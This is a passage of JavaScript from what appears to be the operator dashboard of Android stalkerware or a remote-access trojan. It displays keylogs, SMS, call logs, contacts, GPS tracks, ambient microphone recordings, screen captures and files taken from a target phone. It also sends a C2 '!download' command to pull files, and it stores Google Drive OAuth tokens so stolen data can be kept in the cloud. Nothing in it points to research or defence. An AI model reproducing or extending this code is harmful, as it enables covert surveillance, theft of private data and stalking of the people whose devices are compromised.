            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">⌨️ No keystroke keylogs recorded yet.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="list-group-item bg-dark text-light border-secondary p-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-danger fw-bold"><i class="fa-solid fa-keyboard me-1"></i>${escapeHtml(item.sourceApp || item.app || 'Keylogger')}</span>
                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)}</span>
                </div>
                <div class="font-monospace text-success mt-1 small">${escapeHtml(item.content || item.body || item.text || '')}</div>
            </div>
        `).join("");
    } else if (category === "browser_history" || category === "browser") {
        const container = document.getElementById("browserHistoryTableBody");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<tr><td colspan="4" class="text-center text-muted py-4">🌐 No browser history telemetry recorded yet.</td></tr>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <tr>
                <td><span class="badge bg-info text-dark"><i class="fa-solid fa-compass me-1"></i>${escapeHtml(item.sourceApp || 'Chrome')}</span></td>
                <td class="fw-bold text-light">${escapeHtml(item.title || item.content || 'Web Page')}</td>
                <td><small class="text-muted">${timeStr(item.timestamp)}</small></td>
                <td><a href="${escapeHtml(item.extraUrl || '#')}" target="_blank" class="btn btn-sm btn-outline-info text-nowrap"><i class="fa-solid fa-external-link me-1"></i>Open</a></td>
            </tr>
        `).join("");
    } else if (category === "gps_locations" || category === "gps") {
        const container = document.getElementById("gpsTableBody");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<tr><td colspan="4" class="text-center text-muted py-3">📭 No GPS location records found.</td></tr>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <tr>
                <td><small class="text-muted"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)} (${dateStr(item.timestamp)})</small></td>
                <td><code class="text-success">${item.latitude ? item.latitude.toFixed(5) : '--'}, ${item.longitude ? item.longitude.toFixed(5) : '--'}</code></td>
                <td><span class="badge bg-info extra-small">${item.accuracy ? item.accuracy + 'm' : 'High'}</span></td>
                <td class="small text-light">${escapeHtml(item.content || item.address || 'GPS Coordinates')}</td>
            </tr>
        `).join("");
    } else if (category === "contacts") {
        const container = document.getElementById("contactsTableBody");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<tr><td colspan="4" class="text-center text-muted py-3">📭 No contacts dump received.</td></tr>`;
            return;
        }
        container.innerHTML = items.map(item => `
            <tr>
                <td class="fw-bold text-light"><i class="fa-solid fa-user me-2 text-warning"></i>${escapeHtml(item.name || 'Contact')}</td>
                <td><code class="text-info">${escapeHtml(item.phone || item.number || '')}</code></td>
                <td><span class="badge bg-secondary extra-small">${escapeHtml(item.type || 'Mobile')}</span></td>
                <td>
                    <button class="btn btn-sm btn-outline-success extra-small" onclick="document.getElementById('smsPhoneNum').value='${escapeHtml(item.phone || item.number || '')}'; navigateToRoute('/sms_chat');"><i class="fa-solid fa-comment-sms me-1"></i>SMS</button>
                </td>
            </tr>
        `).join("");
    } else if (category === "calls") {
        const container = document.getElementById("callsTableBody");
        if (container) {
            if (items.length === 0) {
                container.innerHTML = `<tr><td colspan="5" class="text-center text-muted py-3">📭 No call records found.</td></tr>`;
            } else {
                container.innerHTML = items.slice().reverse().map(item => `
                    <tr>
                        <td class="fw-bold text-light">${escapeHtml(item.contact || 'Unknown')}</td>
                        <td><code class="text-info">${escapeHtml(item.number || '')}</code></td>
                        <td><span class="badge ${item.type === 'Incoming' ? 'bg-success' : 'bg-primary'} extra-small">${escapeHtml(item.type || 'Call')}</span></td>
                        <td><small class="text-secondary">${item.duration ? item.duration + 's' : '--'}</small></td>
                        <td><small class="text-muted">${timeStr(item.timestamp)}</small></td>
                    </tr>
                `).join("");
            }
        }
    } else if (category === "photos") {
        const container = document.getElementById("photoGalleryGrid");
        const camContainer = document.getElementById("cameraGalleryGrid");
        const renderGrid = (target) => {
            if (!target) return;
            if (items.length === 0) {
                target.innerHTML = `<div class="col-12 text-center text-muted py-4 small">🖼️ No photos captured yet.</div>`;
                return;
            }
            target.innerHTML = items.slice().reverse().map(item => `
                <div class="col-md-3 col-6">
                    <div class="card bg-dark text-light p-2 text-center border-secondary">
                        <img src="${escapeHtml(item.url || 'https://images.unsplash.com/photo-1512941937669-90a1b58e7e9c?w=300')}" class="card-img-top rounded mb-2" style="height: 140px; object-fit: cover;">
                        <small class="text-truncate d-block extra-small">${escapeHtml(item.name || 'Photo')}</small>
                        <small class="text-muted extra-small">${timeStr(item.timestamp)}</small>
                    </div>
                </div>
            `).join("");
        };
        renderGrid(container);
        renderGrid(camContainer);
    } else if (category === "videos") {
        const container = document.getElementById("videosGridContainer");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="col-12 text-center text-muted py-4 small">🎥 No video recordings captured yet.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="col-md-4 col-6">
                <div class="card bg-dark text-light p-2 text-center border-secondary">
                    <div class="position-relative bg-black rounded mb-2 d-flex align-items-center justify-content-center" style="height: 130px;">
                        <i class="fa-solid fa-circle-play display-5 text-danger"></i>
                    </div>
                    <small class="text-truncate d-block fw-bold">${escapeHtml(item.name || 'Video Clip')}</small>
                    <small class="text-muted extra-small">${timeStr(item.timestamp)}</small>
                </div>
            </div>
        `).join("");
    } else if (category === "installed_apps" || category === "application") {
        const container = document.getElementById("installedAppsGrid");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="col-12 text-center text-muted py-4 small">📦 No package registry items recorded.</div>`;
            return;
        }
        container.innerHTML = items.map(item => `
            <div class="col-md-4 col-6">
                <div class="p-3 bg-dark text-light rounded border border-secondary d-flex align-items-center gap-2">
                    <i class="fa-solid fa-android text-success fs-3"></i>
                    <div class="overflow-hidden">
                        <h6 class="mb-0 fw-bold text-truncate extra-small">${escapeHtml(item.appName || item.name || 'Application')}</h6>
                        <small class="text-muted font-monospace d-block extra-small text-truncate">${escapeHtml(item.packageName || item.pkg || '')}</small>
                    </div>
                </div>
            </div>
        `).join("");
    } else if (category === "files" || category === "storage" || category === "file_explorer") {
        const container = document.getElementById("fileExplorerTableBody");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<tr><td colspan="6" class="text-center text-muted py-4">📂 No file system stream entries found.</td></tr>`;
            return;
        }
        container.innerHTML = items.map(item => `
            <tr>
                <td class="fw-bold text-light"><i class="fa-solid ${item.type === 'dir' ? 'fa-folder text-warning' : 'fa-file text-info'} me-2"></i>${escapeHtml(item.name || 'file')}</td>
                <td><span class="badge bg-secondary extra-small">${escapeHtml(item.type || 'file')}</span></td>
                <td><small class="text-secondary">${item.size ? item.size + ' B' : '--'}</small></td>
                <td><code>${escapeHtml(item.permissions || 'rw-r--r--')}</code></td>
                <td><small class="text-muted">${timeStr(item.timestamp || item.lastModified)}</small></td>
                <td><button class="btn btn-sm btn-outline-success extra-small" onclick="sendC2CommandToDevice('!download ${escapeHtml(item.path || item.name)}')"><i class="fa-solid fa-download me-1"></i>Get</button></td>
            </tr>
        `).join("");
    } else if (category === "audio") {
        const container = document.getElementById("micRecordingsList");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="col-12 text-center text-muted py-4 small">🎙️ No ambient mic audio recordings.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="col-md-6">
                <div class="p-3 bg-dark text-light rounded border border-secondary d-flex justify-content-between align-items-center">
                    <div>
                        <h6 class="fw-bold mb-1"><i class="fa-solid fa-microphone me-2 text-info"></i>${escapeHtml(item.name || 'Ambient Clip')}</h6>
                        <small class="text-muted extra-small">${timeStr(item.timestamp)} | ${item.duration || '15'}s</small>
                    </div>
                    <audio controls src="${escapeHtml(item.url || '')}" class="style-audio-player" style="max-width: 180px;"></audio>
                </div>
            </div>
        `).join("");
    } else if (category === "screenrecorder" || category === "screenshots") {
        const container = document.getElementById("screenrecorderGrid");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="col-12 text-center text-muted py-4 small">📽️ No screen capture clips recorded yet.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="col-md-4 col-6">
                <div class="card bg-dark text-light p-2 text-center border-secondary">
                    <img src="${escapeHtml(item.url || 'https://images.unsplash.com/photo-1616469829941-c7200edec809?w=300')}" class="card-img-top rounded mb-2" style="height: 140px; object-fit: cover;">
                    <small class="text-truncate d-block fw-bold">${escapeHtml(item.name || 'Screen Capture')}</small>
                    <small class="text-muted extra-small">${timeStr(item.timestamp)}</small>
                </div>
            </div>
        `).join("");
    } else if (category === "sms") {
        const container = document.getElementById("smsMessageList");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">💬 No SMS messages found.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="list-group-item bg-dark text-light border-secondary p-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-info text-dark fw-bold"><i class="fa-solid fa-comment me-1"></i>${escapeHtml(item.sender || item.phone || 'SMS')}</span>
                    <span class="text-muted extra-small">${timeStr(item.timestamp)}</span>
                </div>
                <p class="mb-0 small text-light">${escapeHtml(item.text || item.body || '')}</p>
            </div>
        `).join("");
    } else if (category === "geofences") {
        const container = document.getElementById("geofenceListContainer");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-3 extra-small">🌐 No active geofences configured.</div>`;
            return;
        }
        container.innerHTML = items.map(item => `
            <div class="list-group-item bg-dark text-light border-secondary p-2 d-flex justify-content-between align-items-center extra-small">
                <div>
                    <strong class="text-primary"><i class="fa-solid fa-draw-polygon me-1"></i>${escapeHtml(item.name)}</strong>
                    <span class="text-muted ms-2">Radius: ${item.radius}m</span>
                </div>
                <span class="badge bg-success">ACTIVE 🟢</span>
            </div>
        `).join("");
    } else {
        const container = document.getElementById("genericFeedContainer");
        if (!container) return;
        if (items.length === 0) {
            container.innerHTML = `<div class="list-group-item bg-dark text-muted border-secondary text-center py-4 small">📡 No telemetry items recorded for '${category}'.</div>`;
            return;
        }
        container.innerHTML = items.slice().reverse().map(item => `
            <div class="list-group-item bg-dark text-light border-secondary p-3">
                <div class="d-flex justify-content-between align-items-center mb-1">
                    <span class="badge bg-secondary extra-small"><i class="fa-solid fa-layer-group me-1"></i>${escapeHtml(category)}</span>
                    <span class="text-muted extra-small"><i class="fa-solid fa-clock me-1"></i>${timeStr(item.timestamp)}</span>
                </div>
                <p class="mb-0 small text-light">${escapeHtml(item.content || item.body || item.text || JSON.stringify(item))}</p>
            </div>
        `).join("");
    }
}

function setupGoogleDriveOAuthConnect() {
    const btn = document.getElementById("connectGoogleDriveBtn");
    const statusLabel = document.getElementById("gdriveAccountStatus");
    const clientIdInput = document.getElementById("gdriveClientIdInput");
    const saveKeyBtn = document.getElementById("saveGdriveClientIdBtn");

    if (!btn) return;

    const savedClientId = localStorage.getItem("gdrive_client_id") || "";
    if (clientIdInput) {
        clientIdInput.value = savedClientId;
    }

    if (saveKeyBtn && clientIdInput) {
        saveKeyBtn.addEventListener("click", function() {
            const newKey = clientIdInput.value.trim();
            localStorage.setItem("gdrive_client_id", newKey);
            showDashboardNotification("success", "✅ Google OAuth Client ID saved to Browser Storage!");
        });
    }

    const savedDriveToken = localStorage.getItem("gdrive_connected_token");
    if (savedDriveToken && statusLabel) {
        statusLabel.innerHTML = `Status: <strong class="text-success">Connected 🟢 (15 GB Personal Cloud Storage Active)</strong>`;
        btn.className = "btn btn-sm btn-outline-success fw-bold";
        btn.innerHTML = `<i class="fa-brands fa-google me-1"></i>Google Drive Active 🟢`;
    }

    btn.addEventListener("click", function() {
        console.log("[Google Drive OAuth] Launching 1-Click Google Authorization...");
        let client_id = clientIdInput ? clientIdInput.value.trim() : "";
        if (!client_id) {
            client_id = localStorage.getItem("gdrive_client_id") || "";
        }

        if (!client_id) {
            showDashboardNotification("warning", "⚠️ Please enter your Google Cloud OAuth Client ID in the input box above first!");
            if (clientIdInput) clientIdInput.focus();
            return;
        }

        const redirect_uri = window.location.origin + window.location.pathname;
        const scope = "https://www.googleapis.com/auth/drive.file";

        const authUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${client_id}&redirect_uri=${encodeURIComponent(redirect_uri)}&response_type=token&scope=${encodeURIComponent(scope)}`;

        const popup = window.open(authUrl, "GoogleDriveAuth", "width=550,height=650");
        showDashboardNotification("info", "Opening Google Sign-In... Select your Google Account to connect 15 GB Free Storage");

        const checkInterval = setInterval(() => {
            try {
                if (popup && popup.location && popup.location.hash) {
                    const hash = popup.location.hash.substring(1);
                    const params = new URLSearchParams(hash);
                    const accessToken = params.get("access_token");
                    if (accessToken) {
                        clearInterval(checkInterval);
                        popup.close();
                        localStorage.setItem("gdrive_connected_token", accessToken);

                        if (!currentUser || !currentUser.uid) return;
                        const uid = currentUser.uid;
                        firebase.database().ref(`users/${uid}/devices/${activeDeviceId}/gdrive_config`).set({
                            status: "CONNECTED",
                            accessToken: accessToken,
                            updatedAt: Date.now()
                        });

                        if (statusLabel) {
                            statusLabel.innerHTML = `Status: <strong class="text-success">Connected 🟢 (15 GB Personal Cloud Storage Active)</strong>`;
                        }
                        btn.className = "btn btn-sm btn-outline-success fw-bold";
                        btn.innerHTML = `<i class="fa-brands fa-google me-1"></i>Google Drive Active 🟢`;
                        showDashboardNotification("success", "✅ Google Drive Connected! 15 GB Free Cloud Storage Ready");
                    }
                }
            } catch (_) {}
        }, 500);
    });
}
